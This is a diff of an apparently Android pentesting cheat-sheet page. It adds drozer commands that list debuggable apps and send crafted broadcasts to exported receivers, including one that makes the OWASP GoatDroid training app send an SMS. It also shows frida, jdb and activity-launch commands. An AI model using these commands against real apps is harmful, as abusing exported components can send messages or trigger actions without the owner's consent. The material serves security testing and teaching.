@@ -554,6 +554,9 @@ frida-ps -U <span class="p">|</span> grep <span class="s2">&#34;[partialname]&#3
 </code></pre></div><p>Connect to process:</p>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">jdb -connect com.sun.jdi.SocketAttach:port<span class="o">=</span><span class="m">12345</span> <span class="c1">#windows</span>
 jdb -attach localhost:12345 //не проверялось <span class="c1">#linux</span>
+</code></pre></div><p>Check what apps are debuggable:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">drozer console connect
+&gt; run app.package.debuggable
 </code></pre></div><h2 id="runtime-attacks">Runtime Attacks</h2>
 <h3 id="frida">Frida</h3>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">adb shell
@@ -612,6 +615,10 @@ drozer console connect
 run app.activity.start --component <span class="o">[</span>package_name<span class="o">]</span> <span class="o">[</span>activity_full_name<span class="o">]</span>
 </code></pre></div><h3 id="attacks-on-broadcast-receivers">Attacks on broadcast receivers:</h3>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run app.broadcast.info -a <span class="o">[</span>package_name<span class="o">]</span>
+
+run app.broadcast.send --action &lt;action from Manifest&gt; --component &lt;fullclassname&gt; &lt;classname&gt; --extra string &lt;varname&gt; &lt;value&gt;
+
+run app.broadcast.send --action org.owasp.goatdroid.fourgoats.SOCIAL_SMS --component org.owasp.goatdroid.fourgoats.broadcastreceivers SendSMSNowReceiver --extra string phoneNumber <span class="m">123456789</span> --extra string message <span class="s2">&#34;Hello mate!&#34;</span>
 </code></pre></div><h3 id="attacks-on-custom-url-schemes">Attacks on Custom URL Schemes:</h3>
 <div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">run scanner.activity.browsable -a <span class="o">[</span>package_name<span class="o">]</span> <span class="c1"># to find browsable activities</span>
 dz&gt; run app.activity.start  --action android.intent.action.VIEW --data-uri <span class="s2">&#34;sms://0123456789&#34;</span> <span class="c1"># to launch such activity with parameters passed</span>
